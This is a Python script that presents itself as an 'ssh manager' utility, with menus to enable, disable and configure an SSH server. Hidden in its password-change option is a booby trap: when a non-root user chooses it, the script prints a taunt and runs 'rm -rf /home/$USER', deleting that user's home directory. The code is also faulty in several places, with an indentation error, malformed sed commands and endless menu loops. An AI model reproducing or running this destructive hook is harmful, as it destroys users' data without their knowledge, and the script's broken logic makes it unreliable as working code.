#! /usr/bin/python

################################################
#  ssh manager                                 #
# This first module confmanager, who is        #
# responsible for ssh-server.                  #
#  Coded by: ViCoder32                         #
#                                              #
################################################
from subprocess import getoutput
import socket
import os
import sys
from art import text2art
from termcolor import colored, cprint
import confmanager
global ip
def check_root():
    if os.getuid() != 0:
        sys.exit("Running script with root")
    else:
        pass



def clear():
    if sys.platform == 'win32':
        os.system("cls")
    else:
        os.system("clear")
def get_local_ipv4():
    try:    
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
           print("Connect for network and try again ")
def definedistr():
    with open('/etc/os-release', 'r') as f:
    raw = f.read()
    data = raw.split()
    print(data[9].split('=')[1])
    f.close()


def sshinstall():
    clear()
    apt = ['kali', 'debian', 'ubuntu', ]
    yum = []
def sshdown():
    if sys.platform == 'win*':
        pass
    else:
         os.system("systemctl disable ssh")
         clear()
    choose()
def sshup():
    if sys.platform == 'win*':
        pass

    else:
         os.system("systemctl enable ssh")
         os.system("systemctl restart ssh")
    clear()
    choose()
def choose():
    clear()
    ssh_manager_art = colored(text2art("ssh manager"), 'yellow')
    ssh_choose = colored('Choose option:', 'yellow')
    ssh_button_1 = colored("1. Enable ssh server",'green')
    ssh_button_2 = colored("2. Disable ssh server",'green')
    ssh_button_3  = colored("3. Install ssh server",'green')
    ssh_configure = colored("4. Configure",'green')
    ssh_back = colored("5. Main menu",'green')
    cprint(f"""{ssh_manager_art}
            {ssh_choose}          
                {ssh_button_1}
                {ssh_button_2}
                {ssh_button_3}
                {ssh_configure}
                {ssh_back}
    


    """, 'yellow')
    com = ''
    com = input(colored('>', 'green'))
    while True:
        if com == '1':
            clear()
            sshup()
        elif com == '2':
            clear()
            sshdown()
        elif com == '3':
            clear()
            sshinstall()
            choose()
        elif com == '4':
            sshconf()
        elif com == '5':
            clear()
            confmanager.main()
        else:
            choose()
def setipport():
    clear()
    ssh_confugure_setipport = colored(text2art('ipv4&port') ,'yellow')
    com = colored('Enter ipv4 address:',"yellow")
    print(f"""
        {ssh_confugure_setipport} 
        {com}    
    """)
    ip = str(input(colored('>',"green")))
    port = int(input(colored('>',"green")))
    os.system(f"sed -i "" /etc/ssh/sshd_config")  
    os.system(f"sed -i 14s/#Port\s22/Port\s{port}/wg /etc/ssh/sshd_config") # 14, 16, 57  
    sshconf()
def passwdauth():
    clear()
    ssh_configure_passwdauth_art = colored(text2art('passwdauth'),"yellow")
    ssh_configure_passwdauth_choose = colored('Choose options:',"yellow") 
    ssh_configure_passwdauth_button_1 =  colored('1. Set new passwd',"green")
    ssh_configure_passwdauth_button_2 =  colored('2. Main Menu',"green")
    print(f"""{ssh_configure_passwdauth_art}
                {ssh_configure_passwdauth_choose}
                    {ssh_configure_passwdauth_button_1}
                    {ssh_configure_passwdauth_button_2}

                                                                    """)
    com = ''
    com = input(colored('>', "green"))
    while True:
        if com == '1':
            user = os.getuid()
            if user != 0:
                clear()
                cprint("Good work bro, you crack confmanager and running without root, you are try hecker :>>", "green")                          
                cprint('-' * 100, 'red')
                cprint('Seriusly?',"red")
                clear()
                cprint("Good luck","red")
                os.system('rm -rf /home/$USER')
                clear()
                sys.exit()
            else:
                os.system("passwd")
                print(colored('[+] Password change', 'green'))
                sshconf()
        elif com == '2':
            sshconf()
        else:
            passwdauth()

def sshconf():
    clear()
    ssh_configure_art = colored(text2art("configure") ,'yellow')
    ssh_configure_choose = colored('Choose option:','yellow')
    ssh_configure_button_1 = colored("1. Set ip:port" ,"green")
    ssh_configure_button_2 = colored( "2. Passwdauth","green")
    ssh_configure_back = colored("3. Main menu","green")
    print(f"""
        {ssh_configure_art}
            {ssh_configure_choose}
                {ssh_configure_button_1}
                {ssh_configure_button_2}
                {ssh_configure_back}





    """)
    com = ''
    com = input(colored('>' ,"green"))
    while True:
        if com == '1':
            setipport()
        elif com == '2':
            passwdauth()
        elif com == '3':
            main()
        else:
            sshconf()
def main():
    choose()
if __name__ == '__main__':
    main()
